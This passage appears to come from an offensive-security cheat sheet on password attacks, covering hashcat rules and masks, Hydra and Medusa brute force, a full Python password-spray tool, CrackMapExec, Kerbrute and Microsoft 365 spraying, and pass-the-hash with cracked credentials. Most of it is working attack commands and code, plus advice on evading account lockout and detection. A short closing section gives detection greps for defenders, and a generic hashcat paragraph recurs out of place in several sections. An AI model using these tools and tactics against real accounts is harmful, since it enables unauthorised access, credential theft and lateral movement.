rtgen ntlm loweralpha 1 7 0 3800 33554432 0

# Sort tables (required before searching)
rtsort *.rt

# Check available character sets
cat /usr/share/rainbowcrack/charset.txt
```

### rcrack — Rainbow Table Cracking

Use rcrack with pre-generated rainbow tables to crack hashes. This is a time-memory trade-off approach.

```bash
# Crack a single hash
rcrack /path/to/tables/ -h 5f4dcc3b5aa765d61d8327deb882cf99

# Crack hashes from a file
rcrack /path/to/tables/ -l hashes.txt

# Crack NTLM hash
rcrack /opt/rainbowtables/ntlm/ -h 8846f7eaee8fb117ad06bdd830b7586c

# GPU-accelerated version (rcracki_mt)
rcracki_mt -h 5f4dcc3b... /path/to/tables/*.rt
```

### Online Rainbow Table Services

Utilize online rainbow table services such as CrackStation and hashes.com. Unsalted hashes like MD5 and SHA-1 can be looked up quickly.

```bash
# crackstation.net has no public API; use its web form only
# For automation, use hashes.com, which does provide an API
curl -s 'https://hashes.com/en/api/search' \
  -d "hashes[]=5f4dcc3b5aa765d61d8327deb882cf99"
```

---

## Rule-Based Mutations

### Leetspeak Mutations

Advanced hashcat cracking techniques. Use rule-based mutations (`-r`) to append digits and special characters to words, or use mask attacks (`-a 3`) for exhaustive pattern searches. Combining multiple GPUs can dramatically increase cracking speed.

```bash
# Use hashcat's built-in leetspeak rule file
hashcat -m 0 -a 0 hash.txt wordlist.txt \
  -r /usr/share/hashcat/rules/leetspeak.rule

# Custom leetspeak rule file
cat << 'EOF' > leet.rule
# Basic substitutions
sa4
se3
si1
so0
st7
sl1
sg9
# Combined substitutions
sa4se3
sa4si1
so0se3si1
sa4se3si1so0
# Leet + capitalize first letter
sa4 c
se3 c
sa4se3 c
EOF

hashcat -m 0 -a 0 hash.txt wordlist.txt -r leet.rule
```

### Case Mutations

Write case mutation rules. Using hashcat rule files to automatically generate various case combinations of the same word extends the cracking range.

```bash
cat << 'EOF' > case_rules.rule
# All lowercase
l
# All uppercase
u
# Capitalize first letter
c
# Lowercase first letter
C
# Toggle (toggle case of 1st character)
T0
T1
T2
# Alternate case (odd/even toggle)
TN
# Title case (capitalize first letter of each word)
E
EOF

hashcat -m 0 -a 0 hash.txt wordlist.txt -r case_rules.rule
```

### Digit Append Mutations

Mutation rules that append digits before and after words. Covers common patterns of adding years or numbers to passwords.

```bash
cat << 'EOF' > append_rules.rule
# Append single digit
$0
$1
$2
$3
$4
$5
$6
$7
$8
$9
# Append year
Az"2020"
Az"2021"
Az"2022"
Az"2023"
Az"2024"
Az"2025"
# Append two digits
$0$0
$1$1
$1$2$3
# Prepend digit
^1
^2
^1^2^3
# Digits front and back
^1$1
^2$2
# Append special characters
$!
$@
$#
$$
$%
$!$1
Az"!"
Az"@"
Az"123!"
Az"2024!"
# Capitalize first letter + append digit
c $1
c $2
c Az"123"
c Az"2024"
c Az"2024!"
EOF
```

---

## PRINCE Attack

PRINCE (PRobability INfinite Chained Elements) is an advanced form of combination attack.  
It generates candidates in probability-based order by chaining input elements together.

```bash
# Install princeprocessor
git clone https://github.com/hashcat/princeprocessor /opt/prince
cd /opt/prince/src && make
cp pp64.bin /usr/local/bin/pp

# Or via package
sudo apt install hashcat-utils

# Basic usage — generate element combinations
pp /usr/share/wordlists/rockyou.txt | hashcat -m 0 -a 0 hash.txt --stdin

# Limit minimum/maximum element count
pp --pw-min=2 --pw-max=3 wordlist.txt | hashcat -m 0 hash.txt --stdin

# Limit minimum/maximum length
pp --elem-cnt-min=2 --elem-cnt-max=4 \
   --pw-min=8 --pw-max=16 \
   wordlist.txt | hashcat -m 0 hash.txt --stdin

# Limit output count
pp --limit=1000000 wordlist.txt > prince_output.txt

# Include case permutations
pp --case-permute wordlist.txt | head -20

# Print statistics
pp --keyspace wordlist.txt

# Direct PRINCE mode in hashcat (-a 9)
hashcat -m 0 -a 9 hash.txt wordlist.txt

# PRINCE + rules
hashcat -m 0 -a 9 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## Advanced Mask Attacks

### Using .hcmask Files

Apply multiple masks sequentially using .hcmask files. Define multiple masks with different lengths and character sets in one file for automatic execution.

```bash
# hcmask file: one line = one mask
cat << 'EOF' > custom.hcmask
# Commonly used patterns
?u?l?l?l?l?d?d?d?d
?u?l?l?l?l?l?d?d?d
?u?l?l?l?l?d?d?d?d?s
?u?l?l?l?l?l?l?d?d
?u?l?l?l?l?l?l?d?d?s
?l?l?l?l?d?d?d?d
?l?l?l?l?l?d?d?d?d
?l?l?l?l?l?l?d?d?d?d
?d?d?d?d?d?d?d?d
?u?l?l?l?l?l?l?l
EOF

hashcat -m 0 -a 3 hash.txt custom.hcmask

# Use auto-generated hcmask from PACK
python3 /opt/pack/maskgen.py analysis.txt \
  --targettime 3600 \
  --minlength 8 \
  --maxlength 12 \
  -o smart.hcmask

hashcat -m 1000 -a 3 ntlm_hashes.txt smart.hcmask
```

### Custom Character Set Combinations

Advanced hashcat cracking techniques. Use rule-based mutations (`-r`) to append digits and special characters to words, or use mask attacks (`-a 3`) for exhaustive pattern searches. Combining multiple GPUs can dramatically increase cracking speed.

```bash
# Define up to 4 custom character sets with -1 through -4
# Uppercase/lowercase + special character set
hashcat -m 0 -a 3 hash.txt \
  -1 '!@#$%^&*' \
  -2 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' \
  -3 '0123456789' \
  ?2?2?2?2?2?3?3?1

# Reflect national keyboard layout characteristics
hashcat -m 0 -a 3 hash.txt \
  -1 'qwertyuiopasdfghjklzxcvbnm' \
  ?1?1?1?1?1?1?1?1

# Fix known pattern prefix/suffix
# "Pass" + 4 digits
hashcat -m 0 -a 3 hash.txt 'Pass?d?d?d?d'

# "Summer" + year
hashcat -m 0 -a 3 hash.txt 'Summer?d?d?d?d'

# Gradually increasing length (--increment)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a?a?a \
  --increment --increment-min=6 --increment-max=8
```

---

## Online Brute Force — Hydra

Perform online brute force attacks against various services using Hydra. Supports over 50 protocols including HTTP, FTP, SSH, and RDP.

```bash
# Basic syntax
hydra -l <user> -p <pass> <target> <service>
hydra -l <user> -P <passlist> <target> <service>
hydra -L <userlist> -P <passlist> <target> <service>

# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
hydra -L users.txt -P passwords.txt 192.168.1.10 ssh -t 4 -V

# FTP
hydra -l admin -P rockyou.txt ftp://192.168.1.10

# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://192.168.1.10/admin/

# HTTP POST form
hydra -l admin -P rockyou.txt 192.168.1.10 \
  http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"

# HTTPS
hydra -l admin -P rockyou.txt 192.168.1.10 \
  https-post-form "/login:username=^USER^&password=^PASS^:Login failed" -s 443

# RDP
hydra -l administrator -P rockyou.txt rdp://192.168.1.10

# SMB
hydra -l administrator -P rockyou.txt smb://192.168.1.10

# SMTP
hydra -l user@domain.com -P rockyou.txt smtp://mail.domain.com

# MySQL
hydra -l root -P rockyou.txt mysql://192.168.1.10

# Parallelism settings
hydra -l admin -P rockyou.txt 192.168.1.10 ssh \
  -t 4          \   # concurrent connections
  -w 30         \   # timeout (seconds)
  -W 2          \   # wait between connections (seconds)
  -V               # verbose output

# Save results
hydra -l admin -P rockyou.txt 192.168.1.10 ssh -o found.txt

# Resume (-R)
hydra -R

# Specify custom port
hydra -l admin -P rockyou.txt -s 2222 192.168.1.10 ssh

# Attack multiple hosts simultaneously
hydra -l admin -P rockyou.txt -M hosts.txt ssh
```

---

## Online Brute Force — Medusa

Medusa is a parallel online login brute force tool. Supports various protocols including FTP, SSH, and HTTP.

```bash
# Basic syntax
medusa -h <host> -u <user> -P <passlist> -M <module>

# SSH
medusa -h 192.168.1.10 -u root -P rockyou.txt -M ssh

# FTP
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ftp

# HTTP Basic Auth
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M http \
  -m DIR:/admin

# HTTP form
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M web-form \
  -m FORM:/login.php \
  -m FORM-DATA:"post?username=&password=" \
  -m DENY-SIGNAL:"Login failed"

# SMB
medusa -h 192.168.1.10 -u administrator -P rockyou.txt -M smbnt

# Parallelism settings
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh \
  -t 4   \   # concurrent threads
  -T 2   \   # concurrent connections per host
  -f         # stop on first success

# Multiple hosts
medusa -H hosts.txt -u admin -P rockyou.txt -M ssh

# Save results
medusa -h 192.168.1.10 -u admin -P rockyou.txt -M ssh -O results.txt

# List supported modules
medusa -d
```

---

## Python 3.10+ Password Spray Tool

Implement a password spray tool in Python. To avoid account lockouts, attempt only a small number of passwords against multiple accounts with controlled time intervals.

```python
#!/usr/bin/env python3
"""
Password spray tool (HTTP form-based)
Usage: python3 password_spray.py -u users.txt -p passwords.txt -t https://target.com/login
"""

import argparse
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] requests library required: pip install requests", file=sys.stderr)
    sys.exit(1)


@dataclass
class SprayConfig:
    target_url: str
    userlist: Path
    passlist: Path
    user_field: str = "username"
    pass_field: str = "password"
    fail_string: str = "Invalid"
    success_string: str = ""
    threads: int = 3
    delay: float = 1.0          # delay between requests (seconds)
    timeout: int = 10
    proxy: Optional[str] = None
    user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    extra_fields: dict[str, str] = field(default_factory=dict)
    output_file: Optional[Path] = None
    spray_mode: bool = True     # True: 1 password per all users, False: all passwords per 1 user


@dataclass
class Credential:
    username: str
    password: str
    success: bool = False
    status_code: int = 0
    response_len: int = 0
    error: str = ""


class RateLimiter:
    """Thread-safe rate limiter."""

    def __init__(self, delay: float) -> None:
        self.delay = delay
        self._lock = threading.Lock()
        self._last_request = 0.0

    def wait(self) -> None:
        with self._lock:
            now = time.monotonic()
            elapsed = now - self._last_request
            if elapsed < self.delay:
                time.sleep(self.delay - elapsed)
            self._last_request = time.monotonic()


def make_session(config: SprayConfig) -> requests.Session:
    """Create a requests session with retry logic."""
    session = requests.Session()
    session.headers["User-Agent"] = config.user_agent

    retry_strategy = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"],
    )
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    if config.proxy:
        session.proxies = {"http": config.proxy, "https": config.proxy}
        session.verify = False  # Bypass TLS verification when using proxy

    return session


def attempt_login(
    config: SprayConfig,
    username: str,
    password: str,
    session: requests.Session,
    rate_limiter: RateLimiter,
) -> Credential:
    """Single login attempt. Returns Credential object."""
    cred = Credential(username=username, password=password)
    rate_limiter.wait()

    payload: dict[str, str] = {
        config.user_field: username,
        config.pass_field: password,
        **config.extra_fields,
    }

    try:
        resp = session.post(
            config.target_url,
            data=payload,
            timeout=config.timeout,
            allow_redirects=True,
        )
        cred.status_code = resp.status_code
        cred.response_len = len(resp.content)

        # Success determination logic
        if config.success_string:
            cred.success = config.success_string in resp.text
        else:
            cred.success = config.fail_string not in resp.text

        # Account lockout detection
        lockout_indicators = [
            "account locked", "too many attempts", "locked out",
            "temporarily disabled", "계정이 잠겼", "잠금",
        ]
        for indicator in lockout_indicators:
            if indicator.lower() in resp.text.lower():
                cred.error = f"LOCKOUT_DETECTED: {indicator}"
                cred.success = False
                break

    except requests.exceptions.ConnectionError as e:
        cred.error = f"CONNECTION_ERROR: {e}"
    except requests.exceptions.Timeout:
        cred.error = "TIMEOUT"
    except requests.exceptions.TooManyRedirects:
        cred.error = "TOO_MANY_REDIRECTS"
    except requests.exceptions.RequestException as e:
        cred.error = f"REQUEST_ERROR: {e}"

    return cred


def load_list(path: Path) -> list[str]:
    """Load file line by line, removing blank lines and comments."""
    if not path.exists():
        print(f"[!] File not found: {path}", file=sys.stderr)
        sys.exit(1)
    return [
        line.strip()
        for line in path.read_text(encoding="utf-8", errors="ignore").splitlines()
        if line.strip() and not line.startswith("#")
    ]


def spray_attack(config: SprayConfig) -> list[Credential]:
    """
    Spray mode: attempt each password against all users.
    Add delay per password to prevent account lockouts.
    """
    users = load_list(config.userlist)
    passwords = load_list(config.passlist)

    print(f"[*] Target: {config.target_url}")
    print(f"[*] Users: {len(users)} | Passwords: {len(passwords)}")
    print(f"[*] Threads: {config.threads} | Delay: {config.delay}s")
    print(f"[*] Total attempts: {len(users) * len(passwords):,}\n")

    found: list[Credential] = []
    rate_limiter = RateLimiter(config.delay)

    # Spray mode: password → user order
    if config.spray_mode:
        for i, password in enumerate(passwords, 1):
            print(f"[*] Password {i}/{len(passwords)}: {password}")

            tasks: list[tuple[str, str]] = [(u, password) for u in users]

            with ThreadPoolExecutor(max_workers=config.threads) as executor:
                session = make_session(config)
                futures = {
                    executor.submit(
                        attempt_login, config, u, p, session, rate_limiter
                    ): (u, p)
                    for u, p in tasks
                }

                for future in as_completed(futures):
                    cred = future.result()
                    if cred.error and "LOCKOUT" in cred.error:
                        print(f"[!] Account lockout detected: {cred.username} — {cred.error}")
                        print("[!] Recommend aborting attack")
                    elif cred.success:
                        print(f"\n[+] Success! {cred.username}:{cred.password}")
                        found.append(cred)
                    else:
                        pass  # Silently ignore failures

            # Additional delay between passwords (lockout prevention)
            if i < len(passwords):
                spray_delay = max(config.delay * 5, 30.0)
                print(f"[*] Waiting {spray_delay:.0f}s before next password...")
                time.sleep(spray_delay)
    else:
        # Single user + all passwords
        for user in users:
            print(f"[*] User: {user}")
            with ThreadPoolExecutor(max_workers=config.threads) as executor:
                session = make_session(config)
                futures = {
                    executor.submit(
                        attempt_login, config, user, p, session, rate_limiter
                    ): p
                    for p in passwords
                }
                for future in as_completed(futures):
                    cred = future.result()
                    if cred.success:
                        print(f"[+] Success! {cred.username}:{cred.password}")
                        found.append(cred)

    return found


def save_results(results: list[Credential], output_path: Path) -> None:
    lines = [f"{c.username}:{c.password}" for c in results if c.success]
    output_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"[*] Results saved: {output_path}")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="HTTP form password spray tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic spray (1 password per all users)
  python3 password_spray.py -u users.txt -p passwords.txt \\
    -t https://target.com/login --fail-str "Login failed"

  # Custom field names
  python3 password_spray.py -u users.txt -p passwords.txt \\
    -t https://target.com/login \\
    --user-field email --pass-field passwd

  # Via proxy (Burp Suite)
  python3 password_spray.py -u users.txt -p pass.txt \\
    -t https://target.com/login --proxy http://127.0.0.1:8080

  # Single user full brute force mode
  python3 password_spray.py -u single_user.txt -p rockyou.txt \\
    -t https://target.com/login --no-spray -t 8 --delay 0.5
        """,
    )
    parser.add_argument("-u", "--userlist", type=Path, required=True, help="User list file")
    parser.add_argument("-p", "--passlist", type=Path, required=True, help="Password list file")
    parser.add_argument("-t", "--target", required=True, help="Login URL")
    parser.add_argument("--user-field", default="username", help="Username form field (default: username)")
    parser.add_argument("--pass-field", default="password", help="Password form field (default: password)")
    parser.add_argument("--fail-str", default="Invalid", help="String present in failed response")
    parser.add_argument("--success-str", default="", help="String present in successful response")
    parser.add_argument("--threads", type=int, default=3, help="Thread count (default: 3)")
    parser.add_argument("--delay", type=float, default=1.0, help="Delay between requests in seconds (default: 1.0)")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout in seconds")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--no-spray", action="store_true", help="Disable spray mode (all passwords per user)")
    parser.add_argument("-o", "--output", type=Path, help="Output file for results")
    parser.add_argument("--extra-field", action="append", metavar="KEY=VALUE",
                        help="Additional form fields (e.g., --extra-field csrf_token=abc123)")
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    # Parse extra form fields
    extra_fields: dict[str, str] = {}
    if args.extra_field:
        for item in args.extra_field:
            try:
                k, v = item.split("=", 1)
                extra_fields[k] = v
            except ValueError:
                print(f"[!] Invalid --extra-field format: {item}", file=sys.stderr)

    config = SprayConfig(
        target_url=args.target,
        userlist=args.userlist,
        passlist=args.passlist,
        user_field=args.user_field,
        pass_field=args.pass_field,
        fail_string=args.fail_str,
        success_string=args.success_str,
        threads=args.threads,
        delay=args.delay,
        timeout=args.timeout,
        proxy=args.proxy,
        extra_fields=extra_fields,
        output_file=args.output,
        spray_mode=not args.no_spray,
    )

    # URL validation
    parsed = urlparse(config.target_url)
    if not parsed.scheme or not parsed.netloc:
        print(f"[!] Invalid URL: {config.target_url}", file=sys.stderr)
        sys.exit(1)

    try:
        results = spray_attack(config)
    except KeyboardInterrupt:
        print("\n[!] User interrupted")
        sys.exit(0)

    print(f"\n[*] Done — Successful: {len(results)}")
    for cred in results:
        print(f"    {cred.username}:{cred.password}")

    if args.output and results:
        save_results(results, args.output)


if __name__ == "__main__":
    main()
```

---

## Practical Command Reference

### CrackMapExec Password Spray (SMB/WinRM)

Perform password spray attacks against SMB/WinRM protocols using CrackMapExec. Effective for finding valid credentials in domain environments.

```bash
# SMB spray
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt \
  --continue-on-success

# Single password across entire domain
crackmapexec smb 192.168.1.10 -u users.txt -p 'Password2024!' \
  --continue-on-success

# WinRM
crackmapexec winrm 192.168.1.10 -u users.txt -p passwords.txt

# LDAP (AD)
crackmapexec ldap 192.168.1.10 -u users.txt -p 'Password2024!'

# Successful logins shown with [+]
# Locked accounts show STATUS_ACCOUNT_LOCKED_OUT
```

### Kerbrute — Kerberos-Based Spray (Lower Lockout Risk)

Perform Kerberos-based user enumeration and password spraying with Kerbrute. Uses Kerberos error codes instead of Event Log 4625 to reduce detection.

```bash
# Installation
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64 && mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# User enumeration
kerbrute userenum --dc 192.168.1.10 -d domain.local users.txt

# Password spray
kerbrute passwordspray --dc 192.168.1.10 -d domain.local users.txt 'Password2024!'

# Single user brute force
kerbrute bruteuser --dc 192.168.1.10 -d domain.local passwords.txt jdoe

# Save results
kerbrute passwordspray --dc 192.168.1.10 -d domain.local \
  users.txt 'Password2024!' -o results.txt
```

### Spray365 (Microsoft 365)

Spray365 performs password spraying against Microsoft 365 environments. Automatically adjusts time intervals and IPs to bypass smart lockout.

```bash
# Installation
pip install spray365

# M365 spray
spray365 spray -e emails.txt -p passwords.txt \
  --delay 1800    # 30-minute delay (prevent account lockout)

# Consider smart lockout policy: typically 10 attempts/10 min → recommend 1 password/hour
```

### o365spray

Perform Microsoft 365 account enumeration and password spraying with o365spray. Minimizes account lockouts by leveraging multiple endpoints.

```bash
git clone https://github.com/0xZDH/o365spray /opt/o365spray

# Domain validation
python3 /opt/o365spray/o365spray.py --validate --domain target.com

# User enumeration
python3 /opt/o365spray/o365spray.py --enum -U users.txt --domain target.com

# Password spray
python3 /opt/o365spray/o365spray.py --spray \
  -U valid_users.txt \
  -P passwords.txt \
  --domain target.com \
  --sleep 60 \      # 60 seconds between requests
  --count 1         # 1 password at a time
```

---

## Account Lockout Policy Bypass Strategies

Check the domain's account lockout policy. Identify the lockout threshold, observation window, and lockout duration to determine the maximum number of attempts for undetected spraying.

```bash
# 1. Check lockout threshold (AD environment)
crackmapexec smb 192.168.1.10 -u user -p pass --pass-pol

# net command (Windows)
net accounts /domain

# 2. Attempt fewer times than the lockout threshold
# Example: lockout at 5 → attempt only 4 times per password

# 3. Wait for lockout reset time
# Usually 30 min to 1 hour → wait longer

# 4. Attack during off-hours (late night, etc.)

# 5. Kerberos pre-authentication failures may not count toward lockout
# → Use Kerbrute

# 6. Spray mode: 1 password × all users (same password across multiple users)
# Minimizes the rate at which individual user lockout counters increase
```

---

## Using Cracking Results

Advanced hashcat cracking techniques. Use rule-based mutations (`-r`) to append digits and special characters to words, or use mask attacks (`-a 3`) for exhaustive pattern searches. Combining multiple GPUs can dramatically increase cracking speed.

```bash
# Extract results from hashcat pot file
hashcat -m 1000 --show ntlm_hashes.txt
cat ~/.hashcat/hashcat.potfile | grep -f ntlm_hashes.txt

# john pot file
cat ~/.john/john.pot

# Pass-the-Hash with cracked passwords
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  administrator@192.168.1.10

# Direct access with cracked passwords
evil-winrm -i 192.168.1.10 -u administrator -p 'Password123'
impacket-smbclient domain/administrator:Password123@192.168.1.10
```

<!-- detect-validate-22 -->
## Advanced Cracking and Credential-Reuse Lateral Movement Detection Validation

Advanced cracking widens reach via *hybrid/PCFG, distributed cracking, and lateral reuse of recovered credentials*. Defenders must verify **whether abnormal authentication with cracked credentials is detected**. Validate only on **owned domains**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| Hybrid/PCFG | Structured passwords | Entropy policy | Structure-pattern match rate |
| Distributed cracking | High-speed compute | Slow hash | (offline — not directly detectable) |
| Credential-reuse lateral move | Shared passwords | Per-account unique, LAPS | Same cred on multiple hosts |
| Pass-the-hash chaining | NTLM reuse | Enforce Kerberos, restrict NTLM | Abnormal NTLM auth |

### Defense validation (verify directly)

```bash
# 1) Detect same-credential auth from multiple sources (owned domain) — lateral-movement signal
grep -hE "Accepted .* for" /var/log/auth.log 2>/dev/null | awk '{print $9}' | sort | uniq -c | sort -rn | head
# 2) Check for remote-exec traces of cracking tools (own host)
grep -hE "evil-winrm|impacket|wmiexec|psexec|crackmapexec" /var/log/syslog /var/log/auth.log 2>/dev/null | tail
```

> Advanced-cracking defense is *how far a cracked credential reaches* -- "we use strong passwords" differs from "even if one host falls, that cred doesn't work on others". Confirm credential-reuse logons on owned domains directly ([[54_Active_Directory_Attacks]], [[17_Red_Team_Operations]], [[13_SOC_Blue_Team]]).
